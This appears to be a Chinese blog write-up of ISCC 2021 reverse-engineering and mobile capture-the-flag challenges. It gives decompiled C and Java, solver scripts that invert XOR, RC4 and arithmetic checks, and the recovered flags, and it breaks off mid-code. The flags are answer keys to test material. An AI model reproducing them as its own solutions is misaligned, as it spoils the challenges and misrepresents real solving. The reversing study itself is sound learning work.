title="Analysis"></a>Analysis</h2><p>本题和题目描述一样，分析就完事了。<br>拖入32ida，直接就看到了main函数，很常规的输入、变换、比较。</p><blockquote><p>main函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">3</span>]; <span class="comment">// [esp+11h] [ebp-97h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">57</span>]; <span class="comment">// [esp+14h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+4Dh] [ebp-5Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">64</span>]; <span class="comment">// [esp+51h] [ebp-57h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">7</span>]; <span class="comment">// [esp+91h] [ebp-17h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+98h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">4</span> * (((Str - v5 + <span class="number">64</span>) &amp; <span class="number">0xFFFFFFFC</span>) &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  Str[<span class="number">0</span>] = <span class="number">0x43</span>;</span><br><span class="line">  Str[<span class="number">1</span>] = <span class="number">0xDF</span>;</span><br><span class="line">  Str[<span class="number">2</span>] = <span class="number">0x14</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">13</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">44</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">9</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">23</span>;</span><br><span class="line">  v5[<span class="number">6</span>] = <span class="number">23</span>;</span><br><span class="line">  v5[<span class="number">7</span>] = <span class="number">8</span>;</span><br><span class="line">  v5[<span class="number">8</span>] = <span class="number">-4</span>;</span><br><span class="line">  v5[<span class="number">9</span>] = <span class="number">43</span>;</span><br><span class="line">  v5[<span class="number">10</span>] = <span class="number">-6</span>;</span><br><span class="line">  v5[<span class="number">11</span>] = <span class="number">20</span>;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">23</span>;</span><br><span class="line">  v5[<span class="number">13</span>] = <span class="number">-7</span>;</span><br><span class="line">  v5[<span class="number">14</span>] = <span class="number">37</span>;</span><br><span class="line">  v5[<span class="number">15</span>] = <span class="number">-11</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = <span class="number">34</span>;</span><br><span class="line">  v5[<span class="number">17</span>] = <span class="number">61</span>;</span><br><span class="line">  v5[<span class="number">18</span>] = <span class="number">-50</span>;</span><br><span class="line">  v5[<span class="number">19</span>] = <span class="number">0x18</span>;</span><br><span class="line">  v5[<span class="number">20</span>] = <span class="number">0x16</span>;</span><br><span class="line">  v5[<span class="number">21</span>] = <span class="number">0xA</span>;</span><br><span class="line">  qmemcpy(v8, <span class="string">&quot;REVERSE&quot;</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  v9 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="built_in">printf</span>(Format);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  mix(v7, v8, v9);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7[i] != Str[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(Buffer);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(aFlag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mix函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">mix</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">char</span> *Str, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> l; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">size_t</span> k; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">    a1[i] -= <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; a3; ++j )</span><br><span class="line">    a1[j] -= a1[j + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(Str); ++k )</span><br><span class="line">    Str[k] %= <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; a3; ++l )</span><br><span class="line">    a1[l] += Str[l % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; a3 / <span class="number">2</span> &gt; m; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a1[m];</span><br><span class="line">    a1[m] = a1[a3 - m - <span class="number">1</span>];</span><br><span class="line">    a1[a3 - m - <span class="number">1</span>] = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; ; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    result = n;</span><br><span class="line">    <span class="keyword">if</span> ( n &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (Str[n % <span class="number">7</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v3 = a1[n] + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = a1[n] + <span class="number">1</span>;</span><br><span class="line">    a1[n] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数中Str和v5的地址是连续的，所以str+v5就是变化后的flag，mix函数也很简单。</p><blockquote><p>exp</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v3; <span class="comment">// dl</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">char</span> v5; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line">    <span class="keyword">int</span> n; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">    <span class="keyword">int</span> m; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">    <span class="keyword">int</span> l; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">    <span class="keyword">size_t</span> k; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">25</span>]=&#123;<span class="number">0x43</span>, <span class="number">0xdf</span>, <span class="number">0x14</span>, <span class="number">3</span>, <span class="number">0xD</span>, <span class="number">0x2C</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">0x17</span>, <span class="number">0x17</span>, <span class="number">8</span>, <span class="number">0xFC</span>, <span class="number">0x2B</span>, <span class="number">0xFA</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0xF9</span>, <span class="number">0x25</span>, <span class="number">0xF5</span>, <span class="number">0x22</span>, <span class="number">0x3D</span>, <span class="number">0xCE</span>, <span class="number">0x18</span>, <span class="number">0x16</span>, <span class="number">0xA</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> Str[<span class="number">7</span>] = <span class="string">&quot;REVERSE&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> a3 = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">7</span>; ++k )</span><br><span class="line">        Str[k] %= <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">25</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (Str[i % <span class="number">7</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            flag[i] -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            flag[i] -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; a3 / <span class="number">2</span> &gt; m; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = flag[m];</span><br><span class="line">        flag[m] = flag[a3 - m - <span class="number">1</span>];</span><br><span class="line">        flag[a3 - m - <span class="number">1</span>] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; a3; ++l )</span><br><span class="line">        flag[l] -= Str[l % <span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">24</span>; j &gt;= <span class="number">0</span>; --j )</span><br><span class="line">        flag[j<span class="number">-1</span>] += flag[j];</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">        flag[i] += <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{REVERSE_IS_NOT_HARD}</p></blockquote><h2 id="Greedy-Snake"><a href="#Greedy-Snake" class="headerlink" title="Greedy Snake"></a>Greedy Snake</h2><p>用Exeinfo PE查看文件信息</p><p><img src="/2021/05/01/ISCC-2021/4.PNG"></p><p>有upx壳，我用upxshell和upx -d都没有脱掉，然后手动脱壳，ida打开，期间又报了几个错误，不过还是反编译出了主要内容。</p><p><img src="/2021/05/01/ISCC-2021/5.PNG"></p><p>base64解密</p><p><img src="/2021/05/01/ISCC-2021/6.PNG"></p><p>当时没看见12行还有个函数，我直接盲猜是异或，然后试出来是和9异或。<br>之后才发现漏了一个函数，不过也懒得看了，flag已经除了，感觉这题全靠运气…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[] = <span class="string">&quot;@ZJJrV\\YQ(V&lt;&lt;V&lt;9V&lt;1V=gmVK=&lt;l\&quot;Q9[t&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        str[i] ^=<span class="number">9</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{_UPX!_55_50_58_4nd_B45e+X0R}</p></blockquote><h2 id="秘笈"><a href="#秘笈" class="headerlink" title="秘笈"></a>秘笈</h2><h2 id="Ron’s-Code"><a href="#Ron’s-Code" class="headerlink" title="Ron’s Code"></a>Ron’s Code</h2><p>送分题，主要就一个原生的rc4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> T[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> flag[<span class="number">17</span>] = &#123;<span class="string">&#x27;\xE8&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;\xE8&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;\xC9&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\xA9&#x27;</span>,<span class="string">&#x27;\xBA&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;\xDA&#x27;</span>,<span class="string">&#x27;\xF4&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;\xE3&#x27;</span>,<span class="string">&#x27;\xE9&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;\xC1&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">17</span>;</span><br><span class="line">    <span class="keyword">char</span> v5[<span class="number">8</span>]=<span class="string">&quot;ISCC2021&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">        key[i]=v5[i]+i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            T[i] = key[i % <span class="number">8</span>];</span><br><span class="line">            S[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">            j = (T[i] + j +S[i])%<span class="number">256</span>;</span><br><span class="line">            temp = S[i];</span><br><span class="line">            S[i] = S[j];</span><br><span class="line">            S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    i = j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>; r&lt;len;r++)</span><br><span class="line">    &#123;</span><br><span class="line">            i = (i+<span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            j = (j+S[i]) % <span class="number">256</span>;</span><br><span class="line">            temp = S[i];</span><br><span class="line">            S[i] = S[j];</span><br><span class="line">            S[j] = temp;</span><br><span class="line">            t = (S[j]+S[i]) % <span class="number">256</span>;</span><br><span class="line">            flag[r]^=S[t];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]+= v5[i%<span class="number">8</span>];</span><br><span class="line">        flag[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{reverse_rc4}</p></blockquote><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="Mobile-Easy"><a href="#Mobile-Easy" class="headerlink" title="Mobile Easy"></a>Mobile Easy</h2><p>签到题</p><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">getFlag</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">    String str = first.firstStr(paramString);</span><br><span class="line">    <span class="keyword">if</span> (str.length() &lt; <span class="number">15</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    <span class="keyword">if</span> (!str.substring(<span class="number">0</span>, <span class="number">5</span>).equals(<span class="string">&quot;ISCC&#123;&quot;</span>) || !str.substring(str.length() - <span class="number">1</span>).equals(<span class="string">&quot;&#125;&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    paramString = str.substring(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">    str = str.substring(<span class="number">15</span>, str.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> !paramString.equals(second.secondStr()) ? <span class="keyword">false</span> : (!!third.thirdStr(str));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View paramView)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getFlag(((EditText)findViewById(<span class="number">2131165238</span>)).getText().toString())) &#123;</span><br><span class="line">      Toast.makeText((Context)<span class="keyword">this</span>, <span class="string">&quot;right&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      Toast.makeText((Context)<span class="keyword">this</span>, <span class="string">&quot;wrong&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle paramBundle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(paramBundle);</span><br><span class="line">    setContentView(<span class="number">2131296284</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="first"><a href="#first" class="headerlink" title="first"></a>first</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">first</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">firstStr</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> paramString.replace(<span class="string">&quot;B1&quot;</span>, <span class="string">&quot;dN&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;8&quot;</span>).replace(<span class="string">&quot;!&quot;</span>, <span class="string">&quot;P&quot;</span>).replace(<span class="string">&quot;rea&quot;</span>, <span class="string">&quot;hwl&quot;</span>).replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;u&#x27;</span>).replace(<span class="string">&quot;m&quot;</span>, <span class="string">&quot;+&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="second"><a href="#second" class="headerlink" title="second"></a>second</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">secondStr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = <span class="string">&quot;1234567890123456&quot;</span>.getBytes();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte1 = Base64.decode(<span class="string">&quot;9z2ukkD3Ztxhj+t/S1x1Eg==&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      SecretKeySpec secretKeySpec = <span class="keyword">new</span> SecretKeySpec();</span><br><span class="line">      <span class="keyword">this</span>(arrayOfByte, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">      Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/ECB/NoPadding&quot;</span>);</span><br><span class="line">      cipher.init(<span class="number">2</span>, secretKeySpec);</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte2 = cipher.doFinal(arrayOfByte1);</span><br><span class="line">      <span class="keyword">null</span> = <span 